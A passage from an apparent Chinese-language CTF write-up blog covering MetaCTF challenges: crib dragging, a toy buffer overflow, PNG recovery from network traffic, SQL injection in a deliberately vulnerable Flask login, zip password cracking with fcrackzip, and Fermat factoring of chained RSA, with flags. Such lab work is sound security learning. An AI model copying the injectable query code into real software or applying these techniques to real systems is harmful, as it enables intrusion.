5b37d3e51703661c194f7904b5cfb66f5a50f2d1b8d93d86b0ccb87a08023d8bb75c7d0</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://toolbox.lotusfa.com/crib_drag/">https://toolbox.lotusfa.com/crib_drag&#x2F;</a></p>
+<p><img src="/img/metactfimage3.png" alt="image.png"></p>
+<p><img src="/img/metactfimage4.png" alt="image.png"></p>
+<p>可以大概猜測是在某段文字中的其中的文字，找到題目說的那位作者，他應該有個書籍包含了缺失的內容</p>
+<p><img src="/img/metactfimage5.png" alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">It was the best of <span class="built_in">times</span>, it was the worst of <span class="built_in">times</span>, it was the age of wisdom, it was the age of foolishness, it was the epoch of belief, it was the epoch of incredulity, it was the season of Light, it was the season of Darkness, it was the spring of hope, it was the winter of despair, we had everything before us, we had nothing before us, we were all going direct to Heaven, we were all going direct the other way—<span class="keyword">in</span> short, the period was so far like the present period, that some of its noisiest authorities insisted on its being received, <span class="keyword">for</span> good or <span class="keyword">for</span> evil, <span class="keyword">in</span> the superlative degree of comparison only. There were a king with a large jaw and a queen with a plain face, on the throne of England; there were a king with a large jaw and a queen with a fair face, on the throne of France. In both countries it was clearer than crystal to the lords of the State preserves of loaves and fishes, that things <span class="keyword">in</span> general were settled <span class="keyword">for</span> ever.</span><br></pre></td></tr></table></figure>
+
+<p>大概一片猜測之後</p>
+<p><img src="/img/metactfimage6.png" alt="image.png"></p>
+<blockquote>
+<p>MetaCTF{cr1b_dr4gg1ng_7h3_b00k_c1ph3r}</p>
+</blockquote>
+<hr>
+<p>My favorite coffee shop is opening a new website, but they locked it behind a combination lock page! Can you hack the page to get access early?</p>
+<p>Access the site <a target="_blank" rel="noopener" href="http://host5.metaproblems.com:7510/">here</a></p>
+<p><img src="/img/metactfimage7.png" alt="image.png"></p>
+<hr>
+<p>StackSmashers<br>Welcome to the buffer overflow challenge!</p>
+<p>What is a Buffer Overflow?<br>When a program is executed, the CPU processes instructions stored in memory. A stack is an area within memory that is used to store variables, manage function calls, and help control the flow of the program.</p>
+<p>When a program receives data from a user, it is stored on the stack in a “buffer”, which is a designated chunk of memory reserved for that data.</p>
+<p>A buffer overflow occurs when more data is written to a buffer than it can hold. This extra data can overwrite adjacent memory, potentially leading to unexpected behavior or security vulnerabilities.</p>
+<p>Relevant Source Code<br>Take a look at this program. It asks the user to enter a string that will be stored in the buffer section of the memory struct. Note how the buffer can only store 16 bytes.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">void <span class="function"><span class="title">win</span></span>() &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Congratulations! You&#x27;ve successfully performed a buffer overflow! Here&#x27;s your flag: FLAG_REDACTED_IN_SNIPPET&quot;</span>);</span><br><span class="line">//The flag has been removed from this version of the code, <span class="keyword">in</span> the real running code, it will be printed when this <span class="keyword">function</span> is called</span><br><span class="line">&#125;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">struct &#123;</span><br><span class="line">char buffer[16];</span><br><span class="line">bool winner;</span><br><span class="line">&#125; memory;</span><br><span class="line">memory.winner = <span class="literal">false</span>;</span><br><span class="line">gets(memory.buffer);</span><br><span class="line"><span class="keyword">if</span> (memory.winner) &#123;</span><br><span class="line">win();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>How to Solve the Challenge<br>Your goal is to overflow the buffer and set the winner variable to true. The winner variable is located immediately after the buffer in memory. By providing more than 16 characters of input, you can overwrite the winner variable.</p>
+<p>Enter your input below to attempt the buffer overflow:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Submit</span><br><span class="line">Memory layout before input:</span><br><span class="line">0000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">0010  00  </span><br><span class="line"></span><br><span class="line">Enter some data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Memory layout after input:</span><br><span class="line"></span><br><span class="line">0000  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">0010  41       </span><br><span class="line"></span><br><span class="line">Congratulations! You<span class="string">&#x27;ve successfully performed a buffer overflow! Here&#x27;</span>s your flag: MetaCTF&#123;h4ving_fun_m4king_pr0f1t&#125;</span><br><span class="line">                                       .</span><br></pre></td></tr></table></figure>
+
+<p>緩衝區溢出就是…丟一堆字串塞下去就對ㄌ</p>
+<p><img src="/img/metactfimage8.png" alt="image.png"></p>
+<blockquote>
+<p>MetaCTF{h4ving_fun_m4king_pr0f1t}</p>
+</blockquote>
+<hr>
+<p>We captured network traffic of someone connecting to a file share on a server and writing to a few files.</p>
+<p>The flag is in the flag.png file. Find it!</p>
+<p>Hint: see if you can isolate the RPC requests that are responsible for writing files to the file system, and pull out the payload of the one that writes flag.png. Copy Bytes as Raw Binary might be helpful, but there are other valid approaches too.</p>
+<p>找到這邊有寫入的部分</p>
+<p><img src="/img/metactfimage9.png" alt="image.png"></p>
+<p>如果開啟下面設定能看到更多細節</p>
+<p><img src="/img/metactfimage10.png" alt="image.png"></p>
+<p><img src="/img/metactfimage11.png" alt="image.png"></p>
+<p>PNG檔案的開頭會有一個特定的簽名，89 50 4E 47 0D 0A 1A 0A</p>
+<p><img src="/img/metactfimage12.png" alt="image.png"></p>
+<p><img src="/img/metactfimage13.png" alt="image.png"></p>
+<p><img src="/img/metactfimage14.png" alt="image.png"></p>
+<blockquote>
+<p>MetaCTF{th3_n3tw0rk_is_th3_c0mput3r}</p>
+</blockquote>
+<hr>
+<p>My friend went camping near some beautiful lake the other day and sent me a photo, but they refuse to tell me where it was!</p>
+<p>Can you help me figure out the name of that lake?</p>
+<p>Simply enter the name of the lake as the flag. It does not need to be in the MetaCTF{} format.</p>
+<p><img src="/img/metactfimage15.png" alt="image.png"></p>
+<p><img src="/img/metactfimage16.png" alt="image.png"></p>
+<hr>
+<p>I’m trying to log into my online crypto wallet, but I forgot my password! There’s no password reset feature, and I can’t reach support.</p>
+<p>Can you help me log in and get the flag? My username is jim404.</p>
+<p>You can download the source code here. Looks like there might be an issue with how the user input is injected into the SQL query.</p>
+<p><img src="/img/metactfimage17.png" alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, render_template</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">import sqlite3</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">os.chdir(os.path.dirname(os.path.realpath(__file__)))</span><br><span class="line"></span><br><span class="line">db = sqlite3.connect(<span class="string">&quot;db.sqlite&quot;</span>, check_same_thread=False)</span><br><span class="line">db_cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">@app.route(<span class="string">&#x27;/index.html&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def index():</span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def login():</span><br><span class="line">    data = request.json</span><br><span class="line">    username = data.get(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;-&quot;</span>)</span><br><span class="line">    password_hash = hashlib.md5(data.get(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;-&quot;</span>).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    db_error = <span class="string">&quot;&quot;</span></span><br><span class="line">    try:</span><br><span class="line">        query = <span class="string">&quot;SELECT username, public_btc_address, private_btc_key, balance FROM users WHERE username=&#x27;&quot;</span> + username + <span class="string">&quot;&#x27; AND password_hash=&#x27;&quot;</span> + password_hash + <span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line">        result = db_cursor.execute(query)</span><br><span class="line">        user_data = result.fetchone()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        user_data = None</span><br><span class="line">        db_error = str(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_data is None:</span><br><span class="line">        <span class="built_in">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;error&quot;</span>: True,</span><br><span class="line">            <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Login failed. Please try again.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: query,</span><br><span class="line">            <span class="string">&quot;debug_msg&quot;</span>: db_error,</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;error&quot;</span>: False,</span><br><span class="line">            <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Login successful.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: user_data[0],</span><br><span class="line">            <span class="string">&quot;public_btc_address&quot;</span>: user_data[1],</span><br><span class="line">            <span class="string">&quot;private_btc_key&quot;</span>: user_data[2],</span><br><span class="line">            <span class="string">&quot;balance&quot;</span>: user_data[3]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">app.run(debug=True, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>The SQL query is constructed like this:</p>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line">query = <span class="string">&quot;SELECT username, public_btc_address, private_btc_key, balance FROM users WHERE username=&#x27;&quot;</span> + username + <span class="string">&quot;&#x27; AND password_hash=&#x27;&quot;</span> + password_hash + <span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>User-supplied values (<code>username</code> and <code>password</code>) are concatenated directly into the query string, making it vulnerable to SQL Injection.</li>
+</ul>
+</li>
+<li><p>The application does not validate or sanitize input, so malicious input could manipulate the SQL query to bypass authentication.</p>
+</li>
+</ul>
+<p><img src="/img/metactfimage18.png" alt="image.png"></p>
+<p><img src="/img/metactfimage19.png" alt="image.png"></p>
+<hr>
+<p>I need to get into this <a target="_blank" rel="noopener" href="https://metaproblems.com/d36b89698928224c03f29aa2d2cb5544/luggage.zip">archive</a>, but I forgot the password for it as well. All I remember is, it’s the same 4-digit pin I used on my luggage lock…</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt luggage.zip </span></span><br><span class="line">found file <span class="string">&#x27;flag.txt&#x27;</span>, (size <span class="built_in">cp</span>/uc     68/    56, flags 1, chk f38c)</span><br><span class="line">                        </span><br><span class="line">PASSWORD FOUND!!!!: pw == 7123</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/metactfimage20.png" alt="image.png"></p>
+<hr>
+<p>What’s better than RSA? 1024 runs of RSA!</p>
+<p>We encrypted the flag using <a target="_blank" rel="noopener" href="https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/loopy_primes.py">this program</a>, and the output from running the program with the <a target="_blank" rel="noopener" href="https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/output.txt">flag</a> is available here.</p>
+<p>Can you figure out what the original flag was?</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from secrets import FLAG</span><br><span class="line">from Crypto.Util.number import bytes_to_long, getPrime</span><br><span class="line">from sympy import nextprime </span><br><span class="line"></span><br><span class="line">E = 65537</span><br><span class="line">LOOPS = 1024</span><br><span class="line">keysize = 512</span><br><span class="line">pt = bytes_to_long(FLAG)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,LOOPS):</span><br><span class="line">    <span class="comment">#print(f&quot;pt &#123;i&#125;: &#123;pt&#125;&quot;)</span></span><br><span class="line">    p = getPrime(keysize)</span><br><span class="line">    q = nextprime(p)</span><br><span class="line">    n = p*q</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;n &#123;i&#125;: &#123;n&#125;&quot;</span>)    </span><br><span class="line">    ct = pow(pt, E, n)</span><br><span class="line">    pt = ct</span><br><span class="line">    keysize+=1</span><br><span class="line">    <span class="keyword">if</span> i == LOOPS - 1:</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;ct &#123;i&#125;: &#123;ct&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n 0: 58925408247237150718853020288660614964885937087443374494748117153321454897494106350365153437207431995046188449566482398926564680325766021705291969671142407537893105626964976326911173444535099436796060713319386867699316931662339127118126085249539191718287895359339838418358971997170530525806189319780925594989</span><br><span class="line">n 1: 420074976683378657854469830084952452166331743473055570014564677217278678109354411673745923344406469209476033895602263472721449067395081686757235932197766820144127698660254630004481280733415500804393235136927892534076667879707641538667404654805572048375580943632117170785312674084495314753014227063390393253971</span><br><span class="line">n 2: 1559230717146436704258126658878594303835854678919760985172436714506910746263901891106710743493961990464628191090502846776956568264866565700228335235919370966430208637927737297040638052365863727774078564524547976902060128879221804567894768562590230275602281461418831077416735526836794895469692918002247920633673</span><br><span class="line">...</span><br><span class="line">n 1023: 1267919874988366294824754036502102253839007260324431994159563506150527737933721534242973396801528291782062435156001060576106259511187851542673154260334449420573811437511601222626257814850849868036401038254780655406667342662783075675279348081527412407589891876965829954443294919002205278574238340766902606903158754281519494495397829601214540036573007092747269897782321207910274243316347055831965232371918023374086760818426747875311906362251077679481154945695895158664896692153216729025599558239510433848932913871051008234150319960025234545082490863672396770851851918839344920597177301535559330640371198784781384359811154106580798863751965711939656904877044064901234472152935884199640782746451197646516806025000456914468223373262814803272461933323590514938198921544799815384261380125390232828732845529684619654493045148743805154302299521722285312469243036133945037149086165761003738705967996780136020932374602666380997736858769</span><br><span class="line"></span><br><span class="line">ct 1023: 1250021393696525786335144361256414392593842741899479026585356065981817277181288068914492467448549175876062630331679179355487465372606959563984767504620720255739774332272265642671917705941701114225469036166567594052827968764499243560382703470425820431311019975034026645239723973080187014930125726065276819489811844274205868050933689117304876596915537920549094830768541674984384367985548037483091618223908344579452561631433297832894343244227860114298682044575901262345754528530201542566101805629757559712992093692264025791932530650085361520370720560897345946878375718294804530566609217693927191949845442274139788083823261127745109253437341146676011790218622001363252912102009978815070618838677527704373445935401007981220691357785265074004747715150454051491489944469565489921680045495525795924651018931270447789984693706499550173787891272109393797400115911729509755305600161994934603465525212582074265397044150982115224461467939</span><br></pre></td></tr></table></figure>
+
+<p>需要先把n,ct從網站提取出來</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">URL = <span class="string">&quot;https://metaproblems.com/b7efc6dbe8b30f0d5d1a1f333297fbda/output.txt&quot;</span></span><br><span class="line">OUTPUT_FILE = <span class="string">&quot;output_data.txt&quot;</span></span><br><span class="line"></span><br><span class="line">def fetch_data(url):</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 200:</span><br><span class="line">        <span class="built_in">return</span> response.text</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> None</span><br><span class="line"></span><br><span class="line">def extract_n_and_ct(data):</span><br><span class="line">    n_pattern = re.compile(r<span class="string">&quot;n \d+: (\d+)&quot;</span>)</span><br><span class="line">    ct_pattern = re.compile(r<span class="string">&quot;ct \d+: (\d+)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    n_values = n_pattern.findall(data)</span><br><span class="line">    ct_values = ct_pattern.findall(data)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">return</span> n_values, ct_values</span><br><span class="line"></span><br><span class="line">def save_to_file(n_values, ct_values, filename):</span><br><span class="line">    with open(filename, <span class="string">&quot;w&quot;</span>) as f:</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> n_values:</span><br><span class="line">            f.write(f<span class="string">&quot;&#123;n&#125;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> ct <span class="keyword">in</span> ct_values:</span><br><span class="line">            f.write(f<span class="string">&quot;&#123;ct&#125;\n&quot;</span>) </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    data = fetch_data(URL)</span><br><span class="line">    <span class="keyword">if</span> not data:</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    n_values, ct_values = extract_n_and_ct(data)</span><br><span class="line">    save_to_file(n_values, ct_values, OUTPUT_FILE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="RSA-Encryption-and-Decryption-Process"><a href="#RSA-Encryption-and-Decryption-Process" class="headerlink" title="RSA Encryption and Decryption Process:"></a>RSA Encryption and Decryption Process:</h3><ol>
+<li><p><strong>RSA Setup:</strong></p>
+<ul>
+<li><strong>Public Key</strong>: The public key is composed of two parts: <code>E</code> (the exponent) and <code>n</code> (the modulus, which is the product of two large prime numbers <code>p</code> and <code>q</code>).</li>
+<li><strong>Private Key</strong>: The private key is <code>d</code> (the private exponent), computed using Euler’s Totient Function <code>φ(n)</code>, where <code>φ(n) = (p - 1) * (q - 1)</code>.</li>
+</ul>
+</li>
+<li><p><strong>Encryption:</strong></p>
+<ul>
+<li><p>To encrypt the message (which is the flag in this case), the plaintext message is first converted into an integer <code>pt</code>.</p>
+</li>
+<li><p>The encryption is then done using the formula:</p>
+<p><strong>Ciphertext</strong> (<code>ct</code>) &#x3D; <code>pt^E % n</code></p>
+<p>Here, <code>E</code> is a fixed public exponent (commonly <code>65537</code>), and <code>n</code> is the product of two large primes <code>p</code> and <code>q</code>.</p>
+</li>
+</ul>
+</li>
+<li><p><strong>Decryption:</strong></p>
+<ul>
+<li><p>To decrypt, the private exponent <code>d</code> is required. It’s computed as the modular inverse of <code>E</code> modulo <code>φ(n)</code>:</p>
+<p><strong>Private exponent</strong> (<code>d</code>) &#x3D; <code>E^-1 % φ(n)</code></p>
+</li>
+<li><p>The original message is recovered using the formula:</p>
+<p><strong>Plaintext</strong> (<code>pt</code>) &#x3D; <code>ct^d % n</code></p>
+</li>
+</ul>
+</li>
+<li><p><strong>Multiple Encryption Steps:</strong></p>
+<ul>
+<li>The flag is encrypted multiple times (specifically 1024 times), with each encryption step involving a new pair of primes <code>p</code> and <code>q</code>. Each new pair generates a new <code>n</code> value.</li>
+<li>In each step, the ciphertext from the previous encryption is used as the plaintext for the next encryption. This chaining process makes it more difficult to decrypt.</li>
+<li>To recover the original flag, you need to reverse the process starting from the final ciphertext and work backwards, applying the private key <code>d</code> in each step to eventually retrieve the original plaintext.</li>
+</ul>
+</li>
+</ol>
+<h3 id="Key-Observations"><a href="#Key-Observations" class="headerlink" title="Key Observations:"></a><strong>Key Observations:</strong></h3><ol>
+<li><p><strong>Each <code>n</code> is the product of two primes, <code>p</code> and <code>q</code></strong>, and these are different for each encryption step.</p>
+<p> However, unlike traditional RSA, the primes aren’t chosen randomly each time. They are close enough to each other that certain factoring techniques can work.</p>
+</li>
+<li><p><strong>Each step only needs to “undo” the encryption from the previous step</strong>. This is where the main challenge lies. You have to find the right way to reverse each encryption process.</p>
+</li>
+</ol>
+<h3 id="The-Attack-Process"><a href="#The-Attack-Process" class="headerlink" title="The Attack Process:"></a><strong>The Attack Process</strong>:</h3><p>Here’s a rephrased explanation of the process to reverse the RSA encryption chain, formatted for better compatibility with your Hexo site:</p>
+<hr>
+<h3 id="Reversing-the-RSA-Encryption-Chain"><a href="#Reversing-the-RSA-Encryption-Chain" class="headerlink" title="Reversing the RSA Encryption Chain:"></a>Reversing the RSA Encryption Chain:</h3><p>To recover the original flag, we need to reverse the encryption process, which involves the following steps:</p>
+<ol>
+<li><p><strong>Extract the Moduli (<code>n</code>)</strong>:</p>
+<ul>
+<li>The challenge provides a list of the moduli <code>n</code> used during each encryption step (found in <code>output_data.txt</code>). These moduli are the result of multiplying two prime numbers <code>p</code> and <code>q</code>.</li>
+</ul>
+</li>
+<li><p><strong>Factorizing <code>n</code></strong>:</p>
+<ul>
+<li><p>In traditional RSA, factoring <code>n</code> into its prime factors <code>p</code> and <code>q</code> is computationally difficult. However, because the primes <code>p</code> and <code>q</code> are chosen to be close to each other, we can use <strong>Fermat’s Factorization Method</strong> to efficiently factor <code>n</code>. This method is based on the difference of squares formula:</p>
+<p><code>n = (a + b)(a - b)</code></p>
+<p>Here, <code>a</code> and <code>b</code> are integers derived from <code>n</code>.</p>
+</li>
+</ul>
+</li>
+<li><p><strong>Reversing the Encryption</strong>:</p>
+<ul>
+<li><p>Once we have factored <code>n</code> into <code>p</code> and <code>q</code>, we can calculate the Euler’s Totient Function <code>φ(n)</code> using the formula:</p>
+<p><code>φ(n) = (p - 1) * (q - 1)</code></p>
+</li>
+<li><p>Then, we calculate the private key exponent <code>d</code> by finding the modular inverse of <code>E</code> (the public exponent) modulo <code>φ(n)</code>:</p>
+<p><code>d = E^-1 mod φ(n)</code></p>
+</li>
+<li><p>With the private key <code>d</code>, we can decrypt the ciphertext at each step using the formula:</p>
+<p><code>ct = ct^d mod n</code></p>
+<p>This will recover the plaintext for that encryption step, which is then passed as the ciphertext to the next decryption step. We continue this process for all 1024 encryption steps, progressively recovering the original plaintext.</p>
+</li>
+</ul>
+</li>
+<li><p><strong>Recovering the Flag</strong>:</p>
+<ul>
+<li>By applying the decryption steps in reverse order, we eventually recover the original plaintext, which is the flag.</li>
+</ul>
+</li>
+</ol>
+<h3 id="Code-Implementation-Steps"><a href="#Code-Implementation-Steps" class="headerlink" title="Code Implementation Steps:"></a><strong>Code Implementation Steps</strong>:</h3><ol>
+<li><p><strong>Load the Moduli (<code>n</code>)</strong>: Extract the moduli used in the RSA encryptions from <code>output_data.txt</code>. The moduli are stored as integers.</p>
+</li>
+<li><p><strong>Factor Each Modulus <code>n</code></strong>: Apply Fermat’s Factorization method to break each <code>n</code> into its prime factors <code>p</code> and <code>q</code>.</p>
+</li>
+<li><p><strong>Calculate <code>φ(n)</code></strong>: After extracting <code>p</code> and <code>q</code> from <code>n</code>, compute the Euler’s Totient Function <code>φ(n)</code> using the formula <code>φ(n) = (p - 1) * (q - 1)</code>.</p>
+</li>
+<li><p><strong>Compute the Private Exponent <code>d</code></strong>: Using <code>φ(n)</code>, calculate the modular inverse of <code>E</code> to obtain the private exponent <code>d</code>.</p>
+</li>
+<li><p><strong>Decrypt Each Step</strong>: Start with the final ciphertext and apply the RSA decryption formula <code>ct = ct^d mod n</code> for each encryption step, working backward through all the steps.</p>
+</li>
+<li><p><strong>Recover the Flag</strong>: After completing all the decryption steps, convert the final plaintext to bytes, revealing the flag.</p>
+</li>
+</ol>
+<p>最後腳本</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, gcd</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">E = 65537</span><br><span class="line">OUTPUT_FILE = <span class="string">&quot;output_data.txt&quot;</span></span><br><span class="line"></span><br><span class="line">final_ct = 1250021393696525786335144361256414392593842741899479026585356065981817277181288068914492467448549175876062630331679179355487465372606959563984767504620720255739774332272265642671917705941701114225469036166567594052827968764499243560382703470425820431311019975034026645239723973080187014930125726065276819489811844274205868050933689117304876596915537920549094830768541674984384367985548037483091618223908344579452561631433297832894343244227860114298682044575901262345754528530201542566101805629757559712992093692264025791932530650085361520370720560897345946878375718294804530566609217693927191949845442274139788083823261127745109253437341146676011790218622001363252912102009978815070618838677527704373445935401007981220691357785265074004747715150454051491489944469565489921680045495525795924651018931270447789984693706499550173787891272109393797400115911729509755305600161994934603465525212582074265397044150982115224461467939</span><br><span class="line"></span><br><span class="line">def load_moduli(filename):</span><br><span class="line">    with open(filename, <span class="string">&quot;r&quot;</span>) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    n_values = re.findall(r<span class="string">&quot;\d+&quot;</span>, data)</span><br><span class="line">    moduli = [int(n) <span class="keyword">for</span> n <span class="keyword">in</span> n_values]</span><br><span class="line">    <span class="built_in">return</span> moduli</span><br><span class="line"></span><br><span class="line">def fermat_factorization(n):</span><br><span class="line">    a = isqrt(n) + 1</span><br><span class="line">    b2 = a * a - n</span><br><span class="line">    <span class="keyword">while</span> not isqrt(b2)**2 == b2:</span><br><span class="line">        a += 1</span><br><span class="line">        b2 = a * a - n</span><br><span class="line">    b = isqrt(b2)</span><br><span class="line">    p = a + b</span><br><span class="line">    q = a - b</span><br><span class="line">    assert p * q == n, <span class="string">&quot;Fermat factorization failed&quot;</span></span><br><span class="line">    <span class="built_in">return</span> p, q</span><br><span class="line"></span><br><span class="line">def iterative_decrypt(final_ct, moduli, E):</span><br><span class="line">    ct = final_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(len(moduli))):</span><br><span class="line">        n = moduli[i]</span><br><span class="line">        p, q = fermat_factorization(n)</span><br><span class="line">        phi = (p - 1) * (q - 1)</span><br><span class="line">        d = inverse(E, phi)</span><br><span class="line">        ct = pow(ct, d, n) </span><br><span class="line">    <span class="built_in">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    moduli = load_moduli(OUTPUT_FILE)</span><br><span class="line">    recovered_pt = iterative_decrypt(final_ct, moduli, E)</span><br><span class="line">    flag = long_to_bytes(recovered_pt)</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;Recovered FLAG: &#123;flag.decode()&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>MetaCTF{g0t_d0wn_7o_7h3_root_0f_th3_lo0py_pr1mes}</p>
+</blockquote>
+<hr>
+<p>The Federal Bureau of Elfvestigation caught this suspicious letter in the mail, can you decode it to make sure nothing nefarious is going on? Here’s a photocopy of the letter.</p>
+<p><img src="/img/metactff.png" alt="metactff.png"></p>
+<p><a target="_blank" rel="noopener" href="https://rumkin.com/tools/cipher/atbash/">https://rumkin.com/tools/cipher/atbash/</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Wvzi Hsrmmb Fkzgivv,</span><br><span class="line"></span><br><span class="line">Slkv blf<span class="string">&#x27;iv szermt z nviib wzb! R&#x27;</span>n <span class="built_in">rm</span> z yrg lu z hgrxpb hrgfzgrlm</span><br><span class="line">zmw xlfow ivzoob fhv blfi svok.</span><br><span class="line"></span><br><span class="line">Hl, Hftzikofn Nzib nzwv gsvhv znzarmt givzgh uli gsv luurxv</span><br><span class="line">kzigb, zmw, dvoo, R xlfowm<span class="string">&#x27;g ivhrhg. R vmwvw fk vzgrmt zoo lu gsvn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Mld gsviv&#x27;</span>h mlgsrmt ovug uli gsv kzigb, zmw R<span class="string">&#x27;n rm z yrg lu z qzn</span></span><br><span class="line"><span class="string">(mlg fmorpv gsv uroovw wlmfgh szsz). R mvvw gl hlig gsrh lfg yvuliv</span></span><br><span class="line"><span class="string">Hftzikofn Nzib li Hzmgz urmw lfg, li gsv kzigb&#x27;</span>h tlrmt gl yv z </span><br><span class="line">wrhzhgvi.</span><br><span class="line"></span><br><span class="line">Wl blf szev zmb rwvzh li girxph fk blfi hovvev gl svok nv</span><br><span class="line">dsrk fk hlnv mvd givzgh <span class="built_in">rm</span> grnv? R pmld R xzm xlfmg lm blf gl </span><br><span class="line">pvvk gsrh yvgdvvm fh.</span><br><span class="line"></span><br><span class="line">R vmxibkgvw gsrh nvhhztv drgs zgyzhs, hl slkvufoob nb orggov</span><br><span class="line">hvxivg rh hzuv.</span><br><span class="line"></span><br><span class="line">Gszmph z glm uli yvrmt hfxs z tivzg uirvmw. R ldv blf lmv!</span><br><span class="line"></span><br><span class="line">Xsvvih,</span><br><span class="line">Yfhsb Vevitivvm</span><br><span class="line"></span><br><span class="line">K.H. Gszg xlwv blf dviv zhprmt zylfg gl fmolxp gsv wvevolknvmg nlwv </span><br><span class="line">uli gsv Nztrxzo Rmufhrlm Nzxsrmv, N2C24 rh </span><br><span class="line">NvgzXGU&#123;ylgs_givzgh_zmw_nvhhztvh_hglovm&#125;, slkv gszg svokh!</span><br></pre></td></tr></table></figure>
+
